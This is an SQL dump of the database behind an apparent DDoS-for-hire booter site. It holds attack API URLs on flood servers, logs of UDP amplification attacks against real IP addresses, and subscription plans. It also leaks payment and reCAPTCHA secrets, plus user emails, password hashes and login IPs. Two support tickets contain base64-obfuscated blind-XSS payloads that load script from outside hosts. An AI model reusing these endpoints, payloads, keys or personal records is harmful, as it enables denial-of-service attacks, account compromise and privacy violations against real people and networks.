-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Creato il: Gen 02, 2021 alle 04:50
-- Versione del server: 10.3.25-MariaDB-0ubuntu0.20.04.1
-- Versione PHP: 7.2.34-8+ubuntu20.04.1+deb.sury.org+1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `stresser`
--

-- --------------------------------------------------------

--
-- Struttura della tabella `actions`
--

CREATE TABLE `actions` (
  `id` int(64) NOT NULL,
  `admin` varchar(64) NOT NULL,
  `client` varchar(64) NOT NULL,
  `action` varchar(6444) NOT NULL,
  `date` int(21) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `actions`
--

INSERT INTO `actions` (`id`, `admin`, `client`, `action`, `date`) VALUES
(636, 'MemeLord', 'Hub', 'Disabled Hub - 600 seconds', 1458336022),
(637, 'MemeLord', 'Hub', 'Enable Hub ', 1458336041),
(638, 'MemeLord', 'MemeLord', 'User updated to plan: Diamond V.I.P', 1458336081),
(639, 'dandan', 'MemeLord', 'User updated to plan: Gold V.I.P', 1458336082),
(640, 'dandan', 'dandan', 'User updated to plan: Private Admin', 1458336089),
(641, 'dandan', 'Rissy', 'User updated to plan: Gold V.I.P', 1459897264),
(642, 'dandan', 'dandan', 'User updated to plan: Private Admin', 1459897270),
(643, 'Rissy', 'Rissy', 'Users expire updated from 1462489264 to 06-05-2016', 1459897382),
(644, 'Zenon', 'Zenon', 'User updated to plan: Private Admin', 1485484836),
(645, 'Zenon', 'JosieLopez', 'User updated to plan: Private Admin', 1485485823),
(646, 'Zenon', 'JigZz', 'Users expire updated from 0 to 01-01-1970', 1485561380),
(647, 'JigZz', 'JigZz', 'User updated to plan: Owner', 1485562054),
(648, 'Zenon', 'Advanced', 'Users expire updated from 0 to 01-01-1970', 1485562492),
(649, 'Advanced', 'Advanced', 'User updated to plan: Owner', 1485564472),
(650, 'Zenon', 'Ping', 'Users expire updated from 1738022854 to 28-01-2025', 1485577154),
(651, 'Zenon', 'Zenon', 'User updated to plan: Premium Plan', 1485584656),
(652, 'Ping', 'Ping', 'User updated to plan: Supreme Plan', 1485615899),
(653, 'Ping', 'Ping', 'User updated to plan: Owner', 1485642882),
(654, 'sadcenter', 'narul', 'Users expire updated from 0 to 01-01-1970', 1609464253),
(655, 'sadcenter', 'sadcenter', 'User updated to plan: UNLIMITED', 1609465022),
(656, 'sadcenter', 'sadcenter', 'User updated to plan: UNLIMITED', 1609465041),
(657, 'sadcenter', 'sadcenter', 'User updated to plan: UNLIMITED', 1609465061),
(658, 'lvxer', 'lvxer', 'Users expire updated from 2147483647 to 19-01-2038', 1609469128),
(659, 'lvxer', 'sadcenter', 'User updated to plan: UNLIMITED', 1609514935),
(660, 'lvxer', 'sadcenter', 'User updated to plan: UNLIMITED', 1609514949),
(661, 'lvxer', 'sadcenter', 'User updated to plan: UNLIMITED', 1609514953),
(662, 'lvxer', 'sadcenter', 'User updated to plan: UNLIMITED', 1609514979),
(663, 'lvxer', 'sadcenter', 'User updated to plan: UNLIMITED', 1609514996),
(664, 'lvxer', 'sadcenter', 'User updated to plan: UNLIMITED', 1609515002),
(665, 'sadcenter', 'sadcenter', 'User updated to plan: VIP Extra', 1609515016),
(666, 'lvxer', 'sadcenter', 'Users expire updated from 1612193416 to 01-02-2021', 1609517359),
(667, 'lvxer', 'Ajo2k', 'User updated to plan: VIP Starter', 1609517480),
(668, 'lvxer', 'densay', 'User updated to plan: VIP Extra', 1609517549),
(669, 'lvxer', 'ogarekxd', 'User updated to plan: VIP Super', 1609518084),
(670, 'densay', 'densay', 'User updated to plan: UNLIMITED', 1609520213),
(671, 'lvxer', 'lvxer', 'User updated to plan: UNLIMITED', 1609527851),
(672, 'narul', 'narul', 'User updated to plan: UNLIMITED', 1609548853);

-- --------------------------------------------------------

--
-- Struttura della tabella `api`
--

CREATE TABLE `api` (
  `id` int(2) NOT NULL,
  `name` varchar(50) NOT NULL,
  `api` varchar(1024) NOT NULL,
  `slots` int(3) NOT NULL,
  `methods` varchar(100) NOT NULL,
  `type` int(88) NOT NULL,
  `status` int(88) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `api`
--

INSERT INTO `api` (`id`, `name`, `api`, `slots`, `methods`, `type`, `status`) VALUES
(148, 'UDP SERVER #1', 'http://62.171.151.10/api/api.php?key=quick&host=[host]&port=[port]&time=[time]&method=[method]', 30, 'udpbypass ntp dns ldap', 1, 1),
(150, 'UDP SERVER #2', 'http://93.104.209.55/api/api.php?key=quick&host=[host]&port=[port]&time=[time]&method=[method]', 30, 'udpbypass ntp dns ldap', 1, 1);

-- --------------------------------------------------------

--
-- Struttura della tabella `bans`
--

CREATE TABLE `bans` (
  `username` varchar(15) NOT NULL,
  `reason` varchar(1024) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struttura della tabella `blacklist`
--

CREATE TABLE `blacklist` (
  `ID` int(11) NOT NULL,
  `data` varchar(50) NOT NULL,
  `type` varchar(10) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struttura della tabella `faq`
--

CREATE TABLE `faq` (
  `id` int(3) NOT NULL,
  `question` varchar(1024) NOT NULL,
  `answer` varchar(5000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `faq`
--

INSERT INTO `faq` (`id`, `question`, `answer`) VALUES
(25, 'How to contact us', 'You can reach us at our Telegram channel or contact us  directly at @sadcenter koks @narul :) (telegram) you can also join our discord https://discord.gg/vXCww6fjXB'),
(26, 'Can i use vpn or proxy?', 'Yes, and we recommend it for better anonymity on your side');

-- --------------------------------------------------------

--
-- Struttura della tabella `fe`
--

CREATE TABLE `fe` (
  `ID` int(11) NOT NULL,
  `userID` int(11) NOT NULL,
  `type` varchar(1) NOT NULL,
  `ip` varchar(15) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `fe`
--

INSERT INTO `fe` (`ID`, `userID`, `type`, `ip`) VALUES
(8, 1161, 'f', '5.196.68.28'),
(9, 1135, 'e', '99.239.213.40');

-- --------------------------------------------------------

--
-- Struttura della tabella `iplogs`
--

CREATE TABLE `iplogs` (
  `ID` int(11) NOT NULL,
  `userID` int(11) NOT NULL,
  `logged` varchar(15) NOT NULL,
  `date` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struttura della tabella `loginlogs`
--

CREATE TABLE `loginlogs` (
  `username` varchar(15) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `date` int(11) NOT NULL,
  `country` varchar(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `loginlogs`
--

INSERT INTO `loginlogs` (`username`, `ip`, `date`, `country`) VALUES
('MemeLord', '69.248.136.104', 1458335902, 'United States'),
('dandan', '188.120.148.141', 1458335935, 'Israel'),
(' fawfdasdf - fa', '31.210.186.242', 1459895952, 'XX'),
(' fawfdasdf - fa', '31.210.186.242', 1459895952, 'XX'),
('dandan - failed', '31.210.186.242', 1459897173, 'XX'),
('dandan', '31.210.186.242', 1459897180, 'Israel'),
('Rissy', '75.91.180.173', 1459897209, 'United States'),
('kingkhaos', '154.21.28.173', 1609469247, 'United States'),
('nickshryock', '192.80.111.143', 1609477262, 'United States'),
('ak90', '37.187.158.97', 1609489885, 'France'),
('vnmq - failed', '94.240.26.200', 1609502269, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502269, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502275, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502275, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502278, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502278, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502281, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502281, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502287, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502287, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502296, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502296, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502300, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502300, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502302, 'XX'),
('vnmq - failed', '94.240.26.200', 1609502302, 'XX'),
('densay - failed', '194.152.51.247', 1609502658, 'XX'),
('densay', '194.152.51.247', 1609502661, 'Poland'),
('lvxer', '178.218.226.144', 1609511295, 'Poland'),
('lvxer', '178.218.226.144', 1609514611, 'Poland'),
('lvxer', '178.218.226.144', 1609514915, 'Poland'),
('pawdom', '83.20.54.174', 1609515138, 'Poland'),
('ogarekxd', '91.240.132.133', 1609515932, 'Poland'),
('densay - failed', '194.152.51.247', 1609517489, 'XX'),
('densay - failed', '194.152.51.247', 1609517491, 'XX'),
('densay', '194.152.51.247', 1609517494, 'Poland'),
('vnmq - failed', '94.240.26.200', 1609519761, 'XX'),
('vnmq - failed', '94.240.26.200', 1609519761, 'XX'),
('vnmq', '94.240.26.200', 1609519912, 'Poland'),
('Zanhyy - failed', '83.26.246.225', 1609521733, 'XX'),
('Zanhyy - failed', '83.26.246.225', 1609521733, 'XX'),
('Zanhyy - failed', '83.26.246.225', 1609521976, 'XX'),
('Zanhyy - failed', '83.26.246.225', 1609521976, 'XX'),
('Zanhyy', '83.26.246.225', 1609522088, 'Poland'),
('densay', '176.67.86.19', 1609524587, 'United States'),
('wedki', '37.47.192.139', 1609524709, 'Poland'),
('lvxer', '178.218.226.144', 1609526974, 'Poland'),
('densay', '176.67.86.137', 1609530385, 'United States'),
('lvxer', '178.218.226.144', 1609531755, 'Poland'),
('rutzen', '88.251.235.164', 1609532479, 'Turkey'),
('wypad - failed', '89.229.2.194', 1609532745, 'XX'),
('wypad - failed', '89.229.2.194', 1609532745, 'XX'),
('wypad - failed', '89.229.2.194', 1609532891, 'XX'),
('wypad - failed', '89.229.2.194', 1609532891, 'XX'),
('wypad', '89.229.2.194', 1609532954, 'Poland'),
('xkorited', '91.222.60.215', 1609539893, 'Ukraine'),
('TCPSRV', '192.166.223.89', 1609541219, 'Poland'),
('lvxer', '178.218.226.144', 1609545778, 'Poland'),
('densay', '194.152.51.247', 1609545936, 'Poland'),
('mallac', '5.253.206.60', 1609547029, 'Poland'),
('Quick - failed', '93.105.164.230', 1609547397, 'XX'),
('Quick - failed', '93.105.164.230', 1609547397, 'XX'),
('Quick - failed', '93.105.164.230', 1609547404, 'XX'),
('Quick - failed', '93.105.164.230', 1609547404, 'XX'),
('Absence', '5.180.62.103', 1609547425, 'Germany'),
('JustAUserr', '5.180.62.103', 1609547631, 'Germany'),
('Quick - failed', '93.105.164.230', 1609548051, 'XX'),
('Quick - failed', '93.105.164.230', 1609548051, 'XX'),
('Quick - failed', '93.105.164.230', 1609548058, 'XX'),
('Quick - failed', '93.105.164.230', 1609548058, 'XX'),
('Narul - failed', '93.105.164.230', 1609548495, 'XX'),
('narul - failed', '93.105.164.230', 1609548532, 'XX'),
('lvxer', '178.218.226.144', 1609548554, 'Poland'),
('narul - failed', '93.105.164.230', 1609548721, 'XX'),
('narul', '93.105.164.230', 1609548727, 'Poland'),
('Krexythanos', '174.214.12.185', 1609551686, 'United States'),
('d4rky7', '87.65.189.109', 1609553008, 'Belgium'),
('j3east - failed', '5.107.208.113', 1609553239, 'XX'),
('j3east - failed', '5.107.208.113', 1609553239, 'XX'),
('j3east - failed', '5.107.208.113', 1609553247, 'XX'),
('j3east - failed', '5.107.208.113', 1609553247, 'XX'),
('j3east - failed', '5.107.208.113', 1609553334, 'XX'),
('j3east - failed', '5.107.208.113', 1609553334, 'XX'),
('j3east - failed', '5.107.208.113', 1609553381, 'XX'),
('j3east - failed', '5.107.208.113', 1609553381, 'XX'),
('davidvondy', '174.236.134.9', 1609554895, 'United States');

-- --------------------------------------------------------

--
-- Struttura della tabella `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `user` varchar(15) NOT NULL,
  `ip` varchar(1024) NOT NULL,
  `port` int(5) NOT NULL,
  `time` int(4) NOT NULL,
  `method` varchar(10) NOT NULL,
  `date` int(11) NOT NULL,
  `stopped` int(1) NOT NULL DEFAULT 0,
  `handler` varchar(50) NOT NULL,
  `network` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `logs`
--

INSERT INTO `logs` (`id`, `user`, `ip`, `port`, `time`, `method`, `date`, `stopped`, `handler`, `network`) VALUES
(30588, 'sadcenter', '117.27.239.209', 80, 60, 'ldap', 1609516759, 1, 'UDP SERVER #1', 'VIP'),
(30589, 'lvxer', '51.15.9.15', 80, 60, 'udpbypass', 1609517584, 0, 'UDP SERVER #1', 'VIP'),
(30590, 'lvxer', '51.15.9.15', 80, 90, 'dns', 1609517662, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30591, 'lvxer', '178.218.226.16', 80, 30, 'ldap', 1609518634, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30592, 'lvxer', '176.9.64.59', 80, 30, 'ldap', 1609519083, 0, 'UDP SERVER #1,UDP SERVER #2', 'VIP'),
(30593, 'lvxer', '176.9.64.59', 80, 30, 'dns', 1609519129, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30594, 'densay', '185.11.108.207', 80, 300, 'dns', 1609520107, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30595, 'densay', '185.11.108.207', 80, 300, 'dns', 1609520110, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30596, 'Ajo2k', '185.54.59.77', 80, 60, 'ldap', 1609523529, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30597, 'lvxer', '46.204.52.43', 80, 60, 'ldap', 1609526997, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30598, 'lvxer', '46.204.52.43', 80, 60, 'dns', 1609527008, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30599, 'lvxer', '46.204.52.43', 80, 60, 'udpbypass', 1609527011, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30600, 'lvxer', '148.251.132.86', 80, 60, 'udpbypass', 1609527591, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30601, 'lvxer', '148.251.132.86', 80, 60, 'ldap', 1609527593, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30602, 'lvxer', '148.251.132.86', 80, 60, 'dns', 1609527596, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30603, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609527689, 1, 'UDP SERVER #1,UDP SERVER #2', 'VIP'),
(30604, 'lvxer', '148.251.132.85', 80, 60, 'ldap', 1609527870, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30605, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609527872, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30606, 'lvxer', '148.251.132.85', 80, 60, 'ntp', 1609527873, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30607, 'lvxer', '148.251.132.85', 80, 60, 'udpbypass', 1609527876, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30608, 'lvxer', '148.251.132.85', 80, 60, 'ldap', 1609528036, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30609, 'lvxer', '148.251.132.85', 80, 60, 'ntp', 1609528058, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30610, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528096, 0, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30611, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528114, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30612, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528115, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30613, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528116, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30614, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528116, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30615, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528117, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30616, 'lvxer', '148.251.132.85', 80, 60, 'dns', 1609528117, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30617, 'lvxer', '8.40.107.79', 80, 60, 'dns', 1609528227, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30618, 'lvxer', '178.218.226.144', 80, 20, 'dns', 1609528250, 0, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30619, 'lvxer', '178.218.226.144', 80, 20, 'ldap', 1609528261, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30620, 'lvxer', '178.218.226.144', 80, 30, 'udpbypass', 1609528288, 0, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30621, 'lvxer', '178.218.226.144', 80, 30, 'udpbypass', 1609528299, 0, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30622, 'lvxer', '178.218.226.144', 80, 30, 'dns', 1609528303, 0, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30623, 'lvxer', '178.218.226.144', 80, 300, 'ldap', 1609528307, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30624, 'lvxer', '178.218.226.144', 80, 300, 'dns', 1609528418, 1, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30625, 'lvxer', '178.218.226.144', 80, 300, 'ntp', 1609528433, 1, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30626, 'lvxer', '89.64.25.36', 80, 60, 'ldap', 1609531766, 1, 'UDP SERVER #1,UDP SERVER #2', 'VIP'),
(30627, 'lvxer', '185.187.55.89', 80, 60, 'ntp', 1609531928, 0, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30628, 'lvxer', '185.187.55.89', 80, 60, 'ldap', 1609531952, 0, 'UDP SERVER #1,UDP SERVER #2', 'Admin'),
(30629, 'lvxer', '185.187.55.89', 80, 60, 'udpbypass', 1609531956, 0, 'UDP SERVER #2,UDP SERVER #1', 'Admin'),
(30630, 'narul', '94.42.62.76', 80, 120, 'ntp', 1609549618, 1, 'UDP SERVER #1,UDP SERVER #2', 'VIP'),
(30631, 'narul', '94.42.62.76', 80, 120, 'ntp', 1609549691, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30632, 'narul', '94.42.62.76', 80, 120, 'ntp', 1609549774, 1, 'UDP SERVER #2,UDP SERVER #1', 'VIP'),
(30633, 'narul', '94.42.62.76', 80, 120, 'ntp', 1609549837, 0, 'UDP SERVER #2,UDP SERVER #1', 'VIP');

-- --------------------------------------------------------

--
-- Struttura della tabella `messages`
--

CREATE TABLE `messages` (
  `messageid` int(11) NOT NULL,
  `ticketid` int(11) NOT NULL,
  `content` text NOT NULL,
  `sender` varchar(30) NOT NULL,
  `date` int(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `messages`
--

INSERT INTO `messages` (`messageid`, `ticketid`, `content`, `sender`, `date`) VALUES
(569, 248, '<a href=\"test\">atest</a>', 'Client', 1459897238),
(570, 249, 'added', 'Admin', 1609517494);

-- --------------------------------------------------------

--
-- Struttura della tabella `methods`
--

CREATE TABLE `methods` (
  `id` int(2) NOT NULL,
  `name` varchar(30) NOT NULL,
  `fullname` varchar(20) NOT NULL,
  `type` varchar(6) NOT NULL,
  `command` varchar(1000) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `methods`
--

INSERT INTO `methods` (`id`, `name`, `fullname`, `type`, `command`) VALUES
(936, 'udpbypass', 'udpbypass', 'udp', ''),
(935, 'ntp', 'ntp', 'udp', ''),
(934, 'dns', 'dns', 'udp', ''),
(933, 'ldap', 'ldap', 'udp', '');

-- --------------------------------------------------------

--
-- Struttura della tabella `news`
--

CREATE TABLE `news` (
  `ID` int(11) NOT NULL,
  `color` varchar(25) NOT NULL,
  `icon` varchar(25) NOT NULL,
  `title` varchar(1024) NOT NULL,
  `content` varchar(1000) NOT NULL,
  `date` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `news`
--

INSERT INTO `news` (`ID`, `color`, `icon`, `title`, `content`, `date`) VALUES
(97, 'bg-success', 'fa fa-check', 'We back.', 'Sorry, we have issues with vps network.', 1609465890);

-- --------------------------------------------------------

--
-- Struttura della tabella `payments`
--

CREATE TABLE `payments` (
  `ID` int(11) NOT NULL,
  `paid` float NOT NULL,
  `plan` int(11) NOT NULL,
  `user` int(15) NOT NULL,
  `email` varchar(60) NOT NULL,
  `tid` varchar(30) NOT NULL,
  `date` int(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struttura della tabella `plans`
--

CREATE TABLE `plans` (
  `ID` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `mbt` int(11) NOT NULL,
  `unit` varchar(10) NOT NULL,
  `length` int(11) NOT NULL,
  `price` float NOT NULL,
  `concurrents` int(11) NOT NULL,
  `private` int(1) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `plans`
--

INSERT INTO `plans` (`ID`, `name`, `mbt`, `unit`, `length`, `price`, `concurrents`, `private`) VALUES
(37, 'VIP Extra', 300, 'Months', 1, 70, 3, 2),
(36, 'VIP Super', 300, 'Months', 1, 60, 2, 2),
(35, 'VIP Starter', 300, 'Months', 1, 50, 1, 2),
(32, 'Silver', 60, 'Months', 1, 20, 2, 0),
(31, 'Bronze', 60, 'Months', 1, 10, 1, 0),
(33, 'UNLIMITED', 21474836, 'Years', 5, 999, 21474836, 1),
(34, 'Gold', 60, 'Months', 1, 30, 3, 0);

-- --------------------------------------------------------

--
-- Struttura della tabella `reports`
--

CREATE TABLE `reports` (
  `id` int(11) NOT NULL,
  `username` varchar(64) NOT NULL,
  `report` varchar(644) NOT NULL,
  `date` int(64) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struttura della tabella `servers`
--

CREATE TABLE `servers` (
  `id` int(2) NOT NULL,
  `name` varchar(50) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `password` varchar(100) NOT NULL,
  `slots` int(3) NOT NULL,
  `methods` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struttura della tabella `settings`
--

CREATE TABLE `settings` (
  `sitename` varchar(1024) NOT NULL,
  `description` text NOT NULL,
  `paypal` varchar(50) NOT NULL,
  `bitcoin` varchar(50) NOT NULL,
  `maintaince` varchar(100) NOT NULL,
  `rotation` int(1) NOT NULL DEFAULT 0,
  `system` varchar(7) NOT NULL,
  `maxattacks` int(5) NOT NULL,
  `testboots` int(1) NOT NULL,
  `cloudflare` int(1) NOT NULL,
  `skype` varchar(200) NOT NULL,
  `key` varchar(100) NOT NULL,
  `issuerId` varchar(50) NOT NULL,
  `coinpayments` varchar(50) NOT NULL,
  `ipnSecret` varchar(100) NOT NULL,
  `google_site` varchar(644) NOT NULL,
  `google_secret` varchar(644) NOT NULL,
  `btc_address` varchar(64) NOT NULL,
  `secretKey` varchar(50) NOT NULL,
  `cbp` int(1) NOT NULL,
  `paypal_email` varchar(64) NOT NULL,
  `theme` varchar(64) NOT NULL,
  `logo` varchar(64) NOT NULL,
  `hub_status` int(77) NOT NULL,
  `hub_reason` varchar(77) NOT NULL,
  `hub_time` int(43) NOT NULL,
  `hub_rtime` int(65) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `settings`
--

INSERT INTO `settings` (`sitename`, `description`, `paypal`, `bitcoin`, `maintaince`, `rotation`, `system`, `maxattacks`, `testboots`, `cloudflare`, `skype`, `key`, `issuerId`, `coinpayments`, `ipnSecret`, `google_site`, `google_secret`, `btc_address`, `secretKey`, `cbp`, `paypal_email`, `theme`, `logo`, `hub_status`, `hub_reason`, `hub_time`, `hub_rtime`) VALUES
('quick-booter.xyz', 'Stresser tool', '1', '1', '', 0, 'api', 50, 0, 1, '', 'nu113dstr3ss3r', '0', 'a7fd48467b6c1a9f2b75db3fc5c26cc7', 'gdVI1757', '6LeCghMUAAAAAFcjSunoaylnjyRatc--q1e7PGqO', '6LeCghMUAAAAAPdvSIRsyXL7912DvSUrLgZJNIue', '1MMZxo8RfGgsgXcCrFgbg2VLXKphutk76c', 'x01AhBQ8Uc-Vivhtvp-j7w', 1, 'payments759@gmail.com', 'default.min.css', 'fire', 1, '', 0, 1454521325);

-- --------------------------------------------------------

--
-- Struttura della tabella `tickets`
--

CREATE TABLE `tickets` (
  `id` int(11) NOT NULL,
  `subject` varchar(1024) NOT NULL,
  `content` text NOT NULL,
  `status` varchar(30) NOT NULL,
  `username` varchar(15) NOT NULL,
  `date` int(20) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `tickets`
--

INSERT INTO `tickets` (`id`, `subject`, `content`, `status`, `username`, `date`) VALUES
(249, 'handing over the plan', 'hello i had a vip normal plan :)', 'Closed', 'Ajo2k', 1609514670),
(250, 'asddasd', '\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGFmLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs', 'Closed', 'Absence', 1609547518),
(251, 'Discord?', '\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdXNyLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs', 'Closed', 'JustAUserr', 1609547687);

-- --------------------------------------------------------

--
-- Struttura della tabella `users`
--

CREATE TABLE `users` (
  `ID` int(11) NOT NULL,
  `username` varchar(15) NOT NULL,
  `password` varchar(40) NOT NULL,
  `email` varchar(50) NOT NULL,
  `rank` int(11) NOT NULL DEFAULT 0,
  `membership` int(11) NOT NULL,
  `expire` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `referral` varchar(50) NOT NULL,
  `referralbalance` int(3) NOT NULL DEFAULT 0,
  `testattack` int(1) NOT NULL,
  `activity` int(64) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dump dei dati per la tabella `users`
--

INSERT INTO `users` (`ID`, `username`, `password`, `email`, `rank`, `membership`, `expire`, `status`, `referral`, `referralbalance`, `testattack`, `activity`) VALUES
(1471, 'densay', 'ded10471c3246fde35e8ec1f79c9d7ab566898b0', 'daniopremka@gmail.com', 1, 37, 1612134000, 0, '0', 0, 0, 1609547714),
(1470, 'narul', 'c04c5780e1dee3843539ab0f3c8b4c3591bf2786', 'narul@gmail.com', 1, 33, 1767315253, 0, '0', 0, 0, 1609550259),
(1469, 'lvxer', '9652257b84d3aa79ed08845284b3047e6ae0cda4', 'sadcenterek@gmail.com', 1, 33, 1767294251, 0, '0', 0, 0, 1609549098),
(1472, 'kingkhaos', 'ea17a81b63c4149838abd526709cb6bc32385c74', 'kennedyryanskr@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1473, 'alexfootball9', '1620de7c4c62731399db32d7ffc1a23bf5a61487', 'alexfootball91@outlook.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1474, 'nickshryock', 'e2b590b9171c2e410ffabc547b8351b2e4c12098', 'nshryock0825@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1475, 'ak90', '2722de10f66dc034e2839ef584c0791d92051498', 'hvxdhjgvgf@yahoo.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1476, 'Ajo2k', 'd7e88f039f9d849edee5dbe26e9fdc473c18db8e', 'filipbartoszczyk@gmail.com', 0, 35, 1612195880, 0, '0', 0, 0, 0),
(1477, 'sadcenter', '86808586125bf394aaf6b7712c0cd83bdd94250c', 'sadcentertv@protonmail.com', 0, 37, 1612134000, 0, '0', 0, 0, 1609517342),
(1478, 'pawdom', '212c66a29916ad4d75fe9e7f603fc2b73f6ebf5d', 'pawdom420@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1479, 'ogarekxd', 'f51a264f721695c04a3acfaa5011144b31248747', 'michalolszewski800@gmail.com', 0, 36, 1612196484, 0, '0', 0, 0, 0),
(1480, 'mallac', 'da066fbc982c6c3633017da9b0f8b7b42330775d', 'ndlypl@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
